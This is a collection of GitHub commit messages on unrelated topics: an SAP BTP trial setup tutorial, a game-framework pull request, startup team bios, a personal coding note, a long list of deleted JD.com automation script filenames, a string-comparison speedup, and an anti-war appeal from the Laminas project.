## [princejhamanas/Set-up-BTP-account](https://github.com/princejhamanas/Set-up-BTP-account)@[6748578fb5...](https://github.com/princejhamanas/Set-up-BTP-account/commit/6748578fb5e481da57ccdadc9ff2ce63f8c5b891)
#### Wednesday 2022-04-13 14:00:49 by princejhamanas

Update README.md

Even though the course is now closed, you can still access the videos and PDFs in self-paced mode via the openSAP course itself. The hands-on exercises will continue to be available for some time. However, certain steps and screenshots may be out of date as products continue to evolve. Therefore, we cannot guarantee that all exercises will work as expected after the end of the course.

This exercise is part of the openSAP course Building applications on SAP Business Technology Platform with Microsoft services - there you will find more information and context.

Setting up SAP BTP Trial
The objective of the exercise is to create a SAP BTP Trial account that you can further use throughout this course and beyond.

If you already have an SAP BTP Trial account, you don't need to create a new one or move its content to a subaccount in another region! You can then skip this whole unit.

Step 1 - Setting up BTP Trial
In this unit we lay the foundation for the other weeks in this course. You will frequently use SAP Business Technology Platform services that are part of the SAP Business Technology Platform Trial. In the following you will create your own trial account.

IMPORTANT: If you already have an SAP BTP Trial account, you don't need to create a new one or move its content to a subaccount in another region! You can then skip this whole unit.

1.1 Visit SAP Log On Screen and click the Log On icon in the upper-right corner.

SAP Log On

IMPORTANT: In Week 4 of this openSAP course you will register for an SAP Analytics Cloud trial account - these can only be created with sap.com accounts and ensure you’re using a business email. In case you have a sap.com account with a Gmail or Yahoo mail address, we advise you to create a new one with a business email ID

SAP Log On Screen

If you don’t need to register with sap.com, you can skip to Step 1.4.

1.2 If you don’t have an account you will see a register dialog on the left-hand side of the dialog. Fill in the required fields, and click Submit.

SAP Registration

You will see a message that an activation link has been sent to you.

1.3 Check your emails to find the activation button Click to activate your account.

Email Validation

You will see a success message after activating your account.

1.4 After activation, or if you already had an SAP account, go to the SAP BTP Trial page and click Log On.

You will see an dialog to confirm the terms and condition for the SAP BTP Trial. Check the check boxes and click Accept. This simply adds the SAP.com registration to your login account on SAP Cloud Identity.

1.5 Enter your phone number and click New Code to retrieve a code. Please enter this code and click Continue to verify your account. After the verification, you will be logged off automatically.

Phone Verification

1.6 Click on Log on to log on to your verified account.

You will see one main button on the welcome screen of the SAP BTP Cockpit. Click on Enter Your Trial Account to navigate to your global account.

Trial Landingpage

Bookmark the link for fast and quick access to the cockpit.

1.7 Here, you can now create a subaccount that lives in a geographic region. Choose Singapore - Azure from this list and click Create Account to trigger the provisioning process.

Trial Region

1.8 You will then see a dialog box while the account is set up. When complete, click Continue to close to popup and to navigate to the new account.

1.9 Select Go To Your Trial Account.

Trial Button

1.10 The global trial account contains one subaccount and space. Navigate to subaccount by clicking on the tile named trial (this name may vary if you created the subaccount manually).

Make yourself familiar with the basic concepts of SAP Business Technology Platform to make the most of your trial experience.

Trial Global Account

This page will display the current state of the subaccount. You can manage your subscriptions and jump into the different runtime environments. It also shows you fundamental information of the Cloud Foundry environment, such as the API endpoint and the available spaces.

Trial Subaccount

Summary
Congratulations! You have succesfully created your personal SAP BTP trial account! You will use this account through the next weeks of this course to build custom extension scenarios, integration scenarios and data-to-value scenarios.

---
## [Asaayu/qb-core](https://github.com/Asaayu/qb-core)@[9d83a952c2...](https://github.com/Asaayu/qb-core/commit/9d83a952c29fdfd3fb3ca77a45329556a32368f5)
#### Wednesday 2022-04-13 14:25:04 by uShifty

feat: Implement QBCore.Shared.VehicleHashs 

Describe Pull request
Indexs the vehicles jenkins joaat(Hash) value as the key of the table as the key so we dont have to do some shitty ass loop through the vehicles comparing joaat values. I have no clue why this secondary table was removed in the first place if I had to guess people were lazy but this should help the lazys by automatically filling the table.

Questions (please complete the following information):
Have you personally loaded this code into an updated qbcore project and checked all it's functionality? [yes/no] (Be honest) 
Yes

Does your code fit the style guidelines? [yes/no] 
Yes

Does your PR fit the contribution guidelines? [yes/no]
Yes

---
## [blockperks/public](https://github.com/blockperks/public)@[5ecf46a2ec...](https://github.com/blockperks/public/commit/5ecf46a2ece8693a1bffd3704130e8b4e6b3e534)
#### Wednesday 2022-04-13 15:18:39 by Blockperks

Add files via upload

Blockperks Senior Management Team

Gary Collins, CEO
25 years international experience in media advertising and marketing. Over $200M in agency sales delivered for public companies 1996-2020. Leadership of teams 500+ digital media, call centre, direct sales, events, programmatic, search and social. Campaigns for ENRON, EDF, Carphone Warehouse PLC, Ladbrokes, Coral, PHI Token raised $2M, 2 x undisclosed blockchain clients raising $100M+, Founder SuperSonic GmbH DEX, obtained Swiss VQF licence. Founded Blockperks NFT technologies in 2022.

Saher Bin Jung, CFO
10+ years Head of flow credit Asia for Morgan Stanley, experienced crypto trader and NFT portfolio manager. Advisor to KOLO NFT marketplace for classical music.

Elle Ullman, Head of Ecosystem
30+ years celebrity brand development for major A-list celebrities, record labels and fashion brands. Advisor to Byt, founded by team behind $500M NFT project neo tokyo.

Jerad Fink, Chief Strategy Officer
CEO of Cosmic Wire, web3.0 and NFT industry leader, over $200M in NFT sales to date for major Artists, recent acquisition of metaverse arts company, Arts Galore for $31.5M 

Umar Abbas, CTO
Experienced technical developer and blockchain technical lead, multiple blockchain platforms including NFT platforms, exchanges, wallet and payment solutions providers. Chief technical lead at Reactive Space, Rust, Solidity, Smart Contracts, Multicoin wallets, Mobile applications, dApps, CMS, SQL and eCommerce. 

Core development team:
Abubakar Shahzad - Technical project lead and operations strategy 
Dr Danish Rabbiani - Blockchain and smart contract developer
Hamza Aslam - Full stack developer, 
Faiq Khan - Front-end software engineer

---
## [mohammad-alshish/MyNotes](https://github.com/mohammad-alshish/MyNotes)@[b6aeee978a...](https://github.com/mohammad-alshish/MyNotes/commit/b6aeee978aefdb52112d24f708ec338b5427feb7)
#### Wednesday 2022-04-13 15:25:31 by Mohammad majed alshish

*I'm Mohammad alshish, 28 years old, Lives in Amman-Jordan and gradutited as civil engineer since 2017 from Mutah-University.*

*There's nothing much to say about myself but if i really have to say somthing,I really love to learn new staff and improve myself to keep sharp.I blieve learning more & more will change yor life to the best,this why i learn PYTHON right now.*

*Now they always say to make people understand who really you are you need to tell them About your dreams ,well for me this is easy i really want to travel around the world and try new things.*

------------------------------

*There's alot of ideas you need to understand and alot  of things you need to keep in your mind to be a star in developing field*

1. You need always to think of users(people) and make sure your goal is helping them and make   desgin they can use SIMPLE....(NOT ANYBODY IS YOU MY FRIEND)

2.Make sure you understand your the job and the ideas requires from you and do it in good-simple way. complexy not always good thing.

3. You need to care about your work, never forget it and home make it last for the longest time.

4. Always remember not to overestimated or underestimated your work, Is
(Good Enough)  to make your program to do it porpouse in best way.

5. Always face your problems during your projects,try to solve them, don't be shy to  ask for help, no need to be afraid from solving theses problems.

This is what i learn but i think i will learn more & more if you are intrested to learn like me read follow the like [https://www.freecodecamp.org/news/learn-the-fundamentals-of-a-good-developer-mindset-in-15-minutes-81321ab8a682/].

---
## [gys619/Absinthe](https://github.com/gys619/Absinthe)@[f07f0029ea...](https://github.com/gys619/Absinthe/commit/f07f0029eaefa597b6256507f94143337c4c44d1)
#### Wednesday 2022-04-13 16:01:16 by gys619

删除：[ 2000jinli_log.js, CK_WxPusherUid.json, JDJRSignValidator.js, JDJRValidator_Aaron.js, JDJRValidator_Pure.js, JD_DailyBonus.js, JD_extra_cookie.js, JS_USER_AGENTS.js, LICENSE, Loon/lxk0301_LoonTask.conf, QuantumultX/cookies.conf, QuantumultX/gallery.json, QuantumultX/lxk0301_cookies.conf, QuantumultX/lxk0301_gallery.json, Surge/Task.sgmodule, Surge/lxk0301_Task.sgmodule.sgmodule, TS_USER_AGENTS.ts, USER_AGENTS.js, ZooFaker_Necklace.js, activity/JD_extra_cookie.js, activity/jd_0yuankanjia.js, activity/jd_15_5.js, activity/jd_29_8.js, activity/jd_5g.js, activity/jd_818.js, activity/jd_UnknownTask4.js, activity/jd_angryBean.js, activity/jd_apple_live.js, activity/jd_appliances.js, activity/jd_bean_sign.js, activity/jd_beauty_ex.js, activity/jd_big_winner.js, activity/jd_bridge.js, activity/jd_btnyx.py, activity/jd_bzlshdgt.js, activity/jd_car.js, activity/jd_carnivalcity.js, activity/jd_cash.js, activity/jd_cfd_fresh.js, activity/jd_cfd_fresh_exchange.js, activity/jd_cfd_hb.js, activity/jd_cfd_loop.js, activity/jd_cfd_mooncake.js, activity/jd_cfd_mooncake_help.js, activity/jd_cfd_pearl.js, activity/jd_cfd_pearl_ex.js, activity/jd_cfdtx.js, activity/jd_city_exchange.js, activity/jd_city_lottery.js, activity/jd_citytx.js, activity/jd_coupon.js, activity/jd_crazy_joy.js, activity/jd_crazy_joy_bonus.js, activity/jd_crazy_joy_coin.js, activity/jd_daily_egg.js, activity/jd_daily_lottery.js, activity/jd_ddwj.js, activity/jd_decompression.js, activity/jd_delCoupon.js, activity/jd_desire.js, activity/jd_digital_floor.js, activity/jd_djyyj.js, activity/jd_dlpj.js, activity/jd_dpqd.js, activity/jd_ds.js, activity/jd_dyj_help.js, activity/jd_family.js, activity/jd_fcdyj_help_wx.js, activity/jd_fcwb.js, activity/jd_film_museum.js, activity/jd_firecrackers.js, activity/jd_firecrackers2.js, activity/jd_fission.js, activity/jd_focus.js, activity/jd_foodRunning.js, activity/jd_freshgoods.js, activity/jd_ftzy_help.js, activity/jd_global.js, activity/jd_global_mh.js, activity/jd_golden_machine.js, activity/jd_gouwuche.js, activity/jd_gyp.js, activity/jd_haier.js, activity/jd_half_redrain.js, activity/jd_hb.js, activity/jd_health.js, activity/jd_health_plant.py, activity/jd_honour.js, activity/jd_hotNeight.js, activity/jd_hotnight.js, activity/jd_hyj.js, activity/jd_hyj_help.py, activity/jd_immortal.js, activity/jd_immortal_answer.js, activity/jd_industrial_task.js, activity/jd_industryLottery.js, activity/jd_jchsign.js, activity/jd_jdh.js, activity/jd_jika.js, activity/jd_jingsubang.js, activity/jd_joy.js, activity/jd_joy_feedPets.js, activity/jd_joy_park_newtask.js, activity/jd_joy_run.js, activity/jd_joy_steal.js, activity/jd_jump.js, activity/jd_jxd.js, activity/jd_jxdzz.js, activity/jd_jxg.js, activity/jd_jxhlk.js, activity/jd_jxhlk.py, activity/jd_jxnc.js, activity/jd_jxnn.js, activity/jd_jxstory.js, activity/jd_koi_Help.js, activity/jd_kxcdz.js, activity/jd_ldhwj.js, activity/jd_live.js, activity/jd_live_redrain.js, activity/jd_live_redrain2.js, activity/jd_ljd.js, activity/jd_lol.js, activity/jd_lotteryMachine.js, activity/jd_lottery_drew.js, activity/jd_lsj.js, activity/jd_lxLottery.js, activity/jd_market_lottery.js, activity/jd_mcxhd.js, activity/jd_medal_exchange.py, activity/jd_mh.js, activity/jd_mhyyl.js, activity/jd_mhyyl_prize.js, activity/jd_mofang.js, activity/jd_mofang_ex.js, activity/jd_mohe.js, activity/jd_mohe_help.js, activity/jd_moneyTree_help.js, activity/jd_ms.js, activity/jd_ms_redrain.js, activity/jd_mx_shop.js, activity/jd_neight1.js, activity/jd_neight2.js, activity/jd_newTreasure.py, activity/jd_newYearMoney.js, activity/jd_newYearMoney_lottery.js, activity/jd_nian.js, activity/jd_nian_ar.js, activity/jd_nian_sign.js, activity/jd_nian_wechat.js, activity/jd_nsjcj.js, activity/jd_party_night.js, activity/jd_petTreasureBox.js, activity/jd_pubg.js, activity/jd_qcshj.js, activity/jd_qycl.js, activity/jd_redPacket_help.js, activity/jd_ryhxj.js, activity/jd_selectionOffice.js, activity/jd_sendBeans.js, activity/jd_sevenDay.js, activity/jd_shop.js, activity/jd_sign_graphics.js, activity/jd_sjjc.js, activity/jd_sjnhj.js, activity/jd_speed.js, activity/jd_spnvjd.js, activity/jd_summer_movement.js, activity/jd_superMarket.js, activity/jd_super_box.js, activity/jd_super_mh.js, activity/jd_superbox.js, activity/jd_sxLottery.js, activity/jd_tcl.js, activity/jd_teamFLP.js, activity/jd_tewu.js, activity/jd_tiger_help.js, activity/jd_travel.js, activity/jd_travel_help.js, activity/jd_travel_shop.js, activity/jd_unbind.js, activity/jd_unknownTask1.js, activity/jd_unsubscribe.js, activity/jd_watch.js, activity/jd_wxCollectionActivity.js, activity/jd_wxShopFollowActivity.js, activity/jd_xg.js, activity/jd_xgyl.js, activity/jd_xiaolongfan.js, activity/jd_xiaomi.js, activity/jd_xinruimz.js, activity/jd_xinxiangyin.js, activity/jd_xqscjd.js, activity/jd_xtg.js, activity/jd_xtg_help.js, activity/jd_xyhy.js, activity/jd_year.js, activity/jd_yijia.js, activity/jd_yijiajiu.js, activity/jd_ylyn.js, activity/jd_ys.js, activity/jd_zbjmh.js, activity/jd_zoo.js, activity/jd_zooCollect.js, activity/jd_zooElecsport.js, activity/jd_zzt.js, activity/jx_mc_coin.js, activity/jx_sign_xd.js, backUp/AlipayManor.js, backUp/GetJdCookie.md, backUp/GetJdCookie2.md, backUp/GetJdCookie3.md, backUp/JDJRValidator_Smiek.js, backUp/JD_extra_cookie.js, backUp/Jd_jrValidator.js, backUp/MovementFaker.js, backUp/README.md, backUp/TG_PUSH.md, backUp/ZooFaker_Necklace.js, backUp/aclog.png, backUp/elecV2P.md, backUp/getJDCookie.js, backUp/gitSync.md, backUp/githubAction.md, backUp/iCloud.md, backUp/iOS_Weather_AQI_Standard.js, backUp/index.js, backUp/jdFruitShareCodes.js, backUp/jdJxncShareCodes.js, backUp/jdJxncTokens.js, backUp/jdUA.py, backUp/jd_11RedEnvelope.js, backUp/jd_1212red.js, backUp/jd_15_5.js, backUp/jd_19_6.js, backUp/jd_29_8.js, backUp/jd_5_2.js, backUp/jd_DrawEntrance.js, backUp/jd_MMdou.js, backUp/jd_Supershophf.js, backUp/jd_all_bean_change.js, backUp/jd_angryKoi_all.js, backUp/jd_appliances.js, backUp/jd_bean_change.js, backUp/jd_bean_day_change.js, backUp/jd_bean_month_change.js, backUp/jd_beauty_ex.js, backUp/jd_beauty_plant.py, backUp/jd_big_winner.js, backUp/jd_bzlshdgt.js, backUp/jd_car.js, backUp/jd_carnivalcity.js, backUp/jd_cash_exchange.js, backUp/jd_cfd.js, backUp/jd_cfd_SlotMachine.js, backUp/jd_cfd_fresh.js, backUp/jd_cfd_fresh_exchange.js, backUp/jd_cfd_loop.js, backUp/jd_cfd_mooncake.js, backUp/jd_cfd_mooncake_help.js, backUp/jd_cfd_pearl.js, backUp/jd_cfd_pearl_ex.js, backUp/jd_cfdtx.js, backUp/jd_chinaJoy.js, backUp/jd_city_exchange.js, backUp/jd_citytx.js, backUp/jd_cjzdgf.js, backUp/jd_cleancart.js, backUp/jd_collectcardhelp.js, backUp/jd_crazy_joy.js, backUp/jd_crazy_joy_bonus.js, backUp/jd_crazy_joy_coin.js, backUp/jd_daily_egg.js, backUp/jd_daily_lottery.js, backUp/jd_ddPlayer.js, backUp/jd_ddgame.js, backUp/jd_ddo_pk.js, backUp/jd_ddwj.js, backUp/jd_ddwj_help.js, backUp/jd_decompression.js, backUp/jd_delCoupon.js, backUp/jd_djjl.js, backUp/jd_dreamFactory.js, backUp/jd_dt.js, backUp/jd_dtld.js, backUp/jd_earn30.js, backUp/jd_enen.js.bak, backUp/jd_europeancup.js, backUp/jd_exchangejxbeans.js, backUp/jd_family.js, backUp/jd_fan.js, backUp/jd_fc.js, backUp/jd_fcwb.js, backUp/jd_finance.js, backUp/jd_fission.js, backUp/jd_freshgoods.js, backUp/jd_fruit.js, backUp/jd_getFollowGift.py, backUp/jd_goldPhone.js, backUp/jd_goodMorning.js, backUp/jd_gyp.js, backUp/jd_half_redrain.js, backUp/jd_hb_a.js, backUp/jd_health.js, backUp/jd_health_exchange.py, backUp/jd_health_plant.py, backUp/jd_hwsx.js, backUp/jd_hyj.js, backUp/jd_industrial_task.js, backUp/jd_industryLottery.js, backUp/jd_jchsign.js, backUp/jd_jika.js, backUp/jd_jingsubang.js, backUp/jd_jmofang.js, backUp/jd_joy.js, backUp/jd_joy_feedPets.js, backUp/jd_joy_help.js, backUp/jd_joy_park_newtask.js, backUp/jd_joy_run.js, backUp/jd_joy_sendcard_all.py, backUp/jd_joy_steal.js, backUp/jd_joy_tx.js, backUp/jd_joyjd_open.js, backUp/jd_joyjd_open_list.js, backUp/jd_jump.js, backUp/jd_jxcfd_cash100.py, backUp/jd_jxd.js, backUp/jd_jxdzz.js, backUp/jd_jxg.js, backUp/jd_jxlhb.js, backUp/jd_jxmc_mkmb.js, backUp/jd_jxnc.js, backUp/jd_jxnnfls.py, backUp/jd_jxzpk.js, backUp/jd_kanjia.js, backUp/jd_kanjia3.js, backUp/jd_king.js, backUp/jd_kj.js, backUp/jd_kws.js, backUp/jd_kxcdz.js, backUp/jd_kyd.js, backUp/jd_ldhwj.js, backUp/jd_live_redrain.js, backUp/jd_lotteryMachine.js, backUp/jd_lottery_drew.js, backUp/jd_lsj.js, backUp/jd_lxLottery.js, backUp/jd_mall_active.js, backUp/jd_market_lottery.js, backUp/jd_mb.js, backUp/jd_mf_exchange.js, backUp/jd_mfexchange.js, backUp/jd_mhtask.js, backUp/jd_mhyyl.js, backUp/jd_mofang_ex.js, backUp/jd_mohe.js, backUp/jd_mpdzcar.js, backUp/jd_mpdzcar_game.js, backUp/jd_mpdzcar_help.js, backUp/jd_ms.js, backUp/jd_necklace_new.js, backUp/jd_newTreasure.py, backUp/jd_ns_open.js, backUp/jd_nsjdlot.js, backUp/jd_nyx_help.js, backUp/jd_nzmh.js, backUp/jd_olympicgames.js, backUp/jd_pet.js, backUp/jd_phone.js, backUp/jd_plantBean.js, backUp/jd_ppdz.js, backUp/jd_ppkhr.js, backUp/jd_price.js, backUp/jd_qcshj.js, backUp/jd_qixi.js, backUp/jd_qjd.js, backUp/jd_qmwxj.js, backUp/jd_redrain.js, backUp/jd_redrain_half.js, backUp/jd_sendBeans.js, backUp/jd_sevenDay.js, backUp/jd_shop.js, backUp/jd_sign_graphics1.js, backUp/jd_sjnhj.js, backUp/jd_speed.js, backUp/jd_spider_requests.py, backUp/jd_spnvjd.js, backUp/jd_sq.js, backUp/jd_summer_exchange.js, backUp/jd_summer_movement.js, backUp/jd_summer_movement_help.js, backUp/jd_superBrand2.js, backUp/jd_superMarket.js, backUp/jd_superbox.js, backUp/jd_sxLottery.js, backUp/jd_task.json, backUp/jd_tcl.js, backUp/jd_team60.js, backUp/jd_teamAnJia.js, backUp/jd_teamFLP.js, backUp/jd_travel.js, backUp/jd_travel_shop.js, backUp/jd_twlove.js, backUp/jd_twmsdtt.js, backUp/jd_twoly.js, backUp/jd_twzStar.js, backUp/jd_tyt.js, backUp/jd_unbind.js, backUp/jd_unsubscriLive.js, backUp/jd_unsubscribe.js, backUp/jd_userAwardExpandinfo.py, backUp/jd_utils.js, backUp/jd_wish.js, backUp/jd_wjcj.js, backUp/jd_wxCollectionActivity.js, backUp/jd_wxShopFollowActivity.js, backUp/jd_wxj.js, backUp/jd_xiaolongfan.js, backUp/jd_xlong.js, backUp/jd_xmGame.js, backUp/jd_xqscjd.js, backUp/jd_xsqjd.js, backUp/jd_xtc.js, backUp/jd_xtg.js, backUp/jd_xxy.js, backUp/jd_xyhy.js, backUp/jd_year.js, backUp/jd_yijia.js, backUp/jd_ys.js, backUp/jd_zd.js, backUp/jd_zdjr.js, backUp/jd_zjb.js, backUp/jd_zzt.js, backUp/jddj_bean.js, backUp/jinli_log.js, backUp/jx_cfd_pearl_exchange.js, backUp/jx_mczn_exchange.js, backUp/jx_sign_xd.js, backUp/killck.js, backUp/mengniu.js, backUp/mySelf.boxjs.json, backUp/redrian_user.py, backUp/reposync.md, backUp/rush_anjia.js, backUp/sendNotify.js, backUp/tencentscf.md, backUp/webhook.js, backUp/xmSports.js, bot_jd_bean_change.js, boxjs.json, cleancart_activity.js, config.json, docker/Dockerfile, docker/README.md, docker/Readme.md, docker/auto_help.sh, docker/bot/jd.png, docker/bot/jd_bot, docker/bot/requirements.txt, docker/bot/setup.py, docker/default_task.sh, docker/docker-compose.yml, docker/docker_entrypoint.sh, docker/example/custom-append.yml, docker/example/custom-overwrite.yml, docker/example/default.yml, docker/example/docker\345\244\232\350\264\246\346\210\267\344\275\277\347\224\250\347\213\254\347\253\213\345\256\271\345\231\250\344\275\277\347\224\250\350\257\264\346\230\216.md, docker/example/jd_scripts.custom-append.syno.json, docker/example/jd_scripts.custom-overwrite.syno.json, docker/example/jd_scripts.syno.json, docker/example/multi.yml, docker/extra.sh, docker/notify_docker_user.js, docker/proc_file.sh, docker/task_before.sh, function/JDJRValidator_Pure_smiek.js, function/TS_USER_AGENTS.ts, function/common.js, function/config.js, function/eval.js, function/jdValidate.js, function/jdcookie.js, function/jinli_log.ts, function/jxAlgo.js, function/magic.js, function/ql.js, function/sendNotify.js, function/sign_graphics_validate.js, getJDCookie.js, githubAction.md, gua_MMdou.js, gua_cleancart_ddo.js, gua_opencard115.js, gua_opencard117.js, gua_opencard118.js, gua_opencard127.js, gua_opencard128.js, gua_opencard129.js, gua_opencard130.js, gua_opencard131.js, gua_opencard132.js, gua_wealth_island.js, gua_wealth_island_help.js, index.js, jdEnv.py, jd_10-4.js, jd_15_8.js, jd_19-5.js, jd_19_5.js, jd_5_2.js, jd_CheckCK.js, jd_CkSeq.js, jd_DailyBonus_Mod.js, jd_OpenCard.py, jd_OpenCard_Force.js, jd_UpdateUIDtoRemark.js, jd_angryBean.js, jd_bean_change.js, jd_bean_change1.js, jd_bean_home.js, jd_bean_info.js, jd_bean_sign.js, jd_beans_7days.py, jd_beauty.js, jd_beauty_ex.js, jd_beauty_plant.py, jd_captian_anjia.js, jd_car.js, jd_carnivalcity.js, jd_cash_Mod_Panda.js, jd_cash_exchange.js, jd_cash_wx.js, jd_cfd.js, jd_cfd_fresh.js, jd_cfd_hb.js, jd_cfd_loop.js, jd_cfd_mooncake.js, jd_cfd_pearl.js, jd_cfd_pearl_ex.js, jd_cjzdgf.js, jd_cleancart.js, jd_club_lottery.js, jd_daily_egg.js, jd_daily_lottery.js, jd_ddnc_farmpark.js, jd_delCoupon.js, jd_delete_coupon.js, jd_dpqd.js, jd_dpsign.js, jd_dreamFactory.js, jd_dreamFactory_help.js, jd_dreamFactory_tuan.js, jd_duobao.js, jd_dwapp.js, jd_exchangejxbeans.js, jd_family.js, jd_fan.js, jd_farautomation.js, jd_fcwb.js, jd_fcwb.py, jd_follow_shop.js, jd_fruit.js, jd_fruit_Mod.js, jd_fruit_friend.js, jd_fruit_plant.ts, jd_fruit_task.js, jd_getFollowGift.py, jd_gjlh.js, jd_gold_creator.js, jd_goodMorning.js, jd_gua_cleancart_Panda.js, jd_half_redrain.js, jd_hbCount.py, jd_health.js, jd_health_collect.js, jd_health_exchange.py, jd_health_help.js, jd_health_plant.py, jd_jdfactory.js, jd_jdfactory_help.js, jd_jdzz.js, jd_jfcz.js, jd_jieMo.js, jd_jin_tie.js, jd_jinli_hongbao.ts, jd_joy_feedPets.js, jd_joy_park.js, jd_joy_park_Mod.js, jd_joy_park_task.js, jd_joy_reward_Mod.js, jd_joy_run.js, jd_joy_steal.js, jd_joy_tx.js, jd_joyjd_open.js, jd_joypark_open.js, jd_js_sign.js, jd_jump.js, jd_jx_sign.js, jd_jxg.js, jd_jxgckc.js, jd_jxhlk.py, jd_jxlhb.js, jd_jxmc.js, jd_jxmc_hb.js, jd_jxnc.js, jd_jxnn.js, jd_kanjia.js, jd_kd.js, jd_live.js, jd_live_redrain.js, jd_lotteryMachine.js, jd_lzdz1_customized1.js, jd_lzdz1_customized10.js, jd_lzdz1_customized11.js, jd_lzdz1_customized12.js, jd_lzdz1_customized13.js, jd_lzdz1_customized14.js, jd_lzdz1_customized15.js, jd_lzdz1_customized16.js, jd_lzdz1_customized2.js, jd_lzdz1_customized3.js, jd_lzdz1_customized5.js, jd_lzdz1_customized9.js, jd_lzdz1_jx.json, jd_lzkjdz.js, jd_m_sign.js, jd_market_lottery.js, jd_mhtask.js, jd_mncryyj.js, jd_mofang.js, jd_mofang_ex.js, jd_mohe.js, jd_moneyTree.js, jd_moneyTree_help.js, jd_morningSc.js, jd_mpdzcar.js, jd_mpdzcar_game.js, jd_mpdzcar_help.js, jd_ms.js, jd_nzmh.js, jd_pay_contract.js, jd_pet.js, jd_pet_automation.js, jd_petrw.js, jd_pigPet.js, jd_plantBean.js, jd_plantBean_help.js, jd_plusReward.js, jd_price.js, jd_priceProtect_Mod.js, jd_productZ4Brand.js, jd_redrain.js, jd_redrain_half.js, jd_refreshInvokeKey.js, jd_sendBeans.js, jd_sevenDay.js, jd_sgmh.js, jd_share.js, jd_shop.js, jd_shop_sign_duck.js, jd_sign.js, jd_signFree.js, jd_sign_graphics.js, jd_sign_graphics1.js, jd_speed.js, jd_speed_redpocke.js, jd_speed_sign.js, jd_speed_signred.js, jd_superBrandStar.js, jd_superMarket.js, jd_sxLottery.js, jd_test.js, jd_try.js, jd_try_notify.py, jd_tyt.js, jd_unbind.js, jd_unsubscriLive.js, jd_unsubscribe.js, jd_upgrade.js, jd_wdz.js, jd_week.js, jd_wish.js, jd_wq_wxsign.js, jd_wsdlb.js, jd_wxCollectionActivity.js, jd_wxgame.js, jd_wyw.js, jd_xinruimz.js, jd_xs_zzl.js, jd_yfcoupon.js, jd_ylyn.js, jd_zdjr.js, jd_zjb.js, jd_zjb_help.js, jddjCookie.js, jddj_bean.js, jddj_fruit.js, jddj_fruit_collectWater.js, jddj_getPoints.js, jddj_getck.js, jddj_plantBeans.js, joy_run_token.json, jx_cfd_card.js, jx_factory_automation.js, jx_sign.js, jx_sign_xd.js, lxk0301.boxjs.json, magic.json, magic.py, mount.sh, notify.md, package.json, sendNotify.js, sendNotify.py, serverless.yml, shell_script_mod.sh, sign_graphics_validate.js, test.js, tools/a.py, tools/empty.json, tools/jd_dreamFactory_product.js, utils/JDCookie.py, utils/JDJRValidator.js, utils/JDJRValidator_Pure.js, utils/JDJRValidator_Pure1.js, utils/JDSignValidator.js, utils/JD_DailyBonus.js, utils/MoveMentFaker.js, utils/MovementFaker.js, utils/TS_USER_AGENTS.ts, utils/USER_AGENTS.js, utils/ZooFaker_Necklace.js, utils/common.js, utils/config.js, utils/eval.js, utils/jdCookie.js, utils/jdShareCodes.js, utils/jdValidate.js, utils/jd_jxmcToken.js, utils/jd_sign_validate.js, utils/jdcookie.js, utils/jinli_log.ts, utils/jxAlgo.js, utils/magic.js, utils/ql.js, utils/sendNotify.js, utils/sign_graphics_validate.js, utils/sign_graphics_validate1.js]

---
## [lgritz/oiio](https://github.com/lgritz/oiio)@[f63e9483ff...](https://github.com/lgritz/oiio/commit/f63e9483ff779dfa9fc735257732d33b5773c613)
#### Wednesday 2022-04-13 16:05:20 by Larry Gritz

Speed up case insensitive string comparisons

Oh boy, never leave anything unbenchmarked.

Turns out the boost::algorithm functions we were relying on underneath
many Strutil "case-insensitive" comparisons were ridiculously slow.
We thought they were good enough because they allowed specification of
locale, so we could just pass the static classic locale, and so they
would be inexpensive because they didn't have to query the current
locale.  But this is wrong, they were still ghastly.

So here I rewrite Strutil::iequals, iless, starts_with, istarts_with,
ends_with, iends_with in terms of a new (internal) Strutil::strcasecmp
and strncasecmp (which underneath handle differences in platform, and
use the locale-independent versions). The net result is that most of
those case-independent comparisons speed up by a factor of
50-100x. Wow.

I still need to tackle the family of 'ifind' related functions. They
are a bit trickier. But I'll leave them for another time, because I
need to roll this present fix out right away to fix a real production
bottleneck.

(Worth noting: iequals is instrumental when you're searching a
ParamValueList for a particular name, which is what happens when you
look up attributes from an ImageSpec, which is what happens when you
call get_texture_info(), which is what underlies OSL gettextureinfo()
calls in the cases that they cannot be constant-folded during runtime
optimization. So this came to my attention when analyzing a slow scene
whose shaders had a pathological explosion of gettextureinfo calls that
couldn't be optimized away.)

---
## [Koen1999/laminas-mvc-skeleton](https://github.com/Koen1999/laminas-mvc-skeleton)@[5f25a26ba6...](https://github.com/Koen1999/laminas-mvc-skeleton/commit/5f25a26ba64d6fc96e335cb7185e0847d6194c52)
#### Wednesday 2022-04-13 17:06:06 by Michał Bundyra

Message against the war, in Russian and English

🇷🇺 Русским гражданам

Мы, участники Laminas, родились и живем в разных странах. У многих из нас есть друзья, родственники и коллеги как в России, так и в Украине. Некоторые из нас родились в России. Некоторые из нас живут в России. У некоторых бабушки и дедушки сражались с фашистами во Второй мировой войне. Здесь никто не поддерживает фашизм.

У одного из нас есть украинская родственница, которая спаслась из дома вместе с сыном. Поезд задержался из-за бомбежки на дороге впереди. У нас есть друзья, которые прячутся в бомбоубежищах. Мы с тревогой ждем весточки от них после воздушных налетов, которые беспорядочно наносят удары и попадают по больницам, школам, детским садам и домам. Мы не берем это из каких-либо СМИ. Мы наблюдаем это напрямую.

Вы доверяете нам достаточно, чтоб использовать наши программы, и мы просим вас довериться нам вновь. Мы нуждаемся в помощи. Выходите и протестуйте против этой бесполезной войны. Остановите кровопролитие. Скажите "Нет войне!"

🇺🇸 To Citizens of Russia

We at Laminas come from all over the world. Many of us have friends, family and colleagues in both Russia and Ukraine. Some of us were born in Russia. Some of us currently live in Russia. Some have grandparents who fought Nazis in World War II. Nobody here supports fascism.

One team member has a Ukrainian relative who fled her home with her son. The train was delayed due to bombing on the road ahead. We have friends who are hiding in bomb shelters. We anxiously follow up on them after the air raids, which indiscriminately fire at hospitals, schools, kindergartens and houses. Were not taking this from any media. These are our actual experiences.

You trust us enough to use our software. We ask that you trust us to say the truth on this. We need your help. Go out and protest this unnecessary war. Stop the bloodshed. Say "stop the war!"

Signed-off-by: Michał Bundyra <contact@webimpress.com>

---
## [CASEYGUNGEON/Skyrat-Gungeon](https://github.com/CASEYGUNGEON/Skyrat-Gungeon)@[8607ba8b7d...](https://github.com/CASEYGUNGEON/Skyrat-Gungeon/commit/8607ba8b7d98c52e81f23816a9224adf70559c25)
#### Wednesday 2022-04-13 17:16:24 by SkyratBot

[MIRROR] Adds a very rare sussy firelock [MDB IGNORE] (#12401)

* Adds a very rare sussy firelock (#65677)

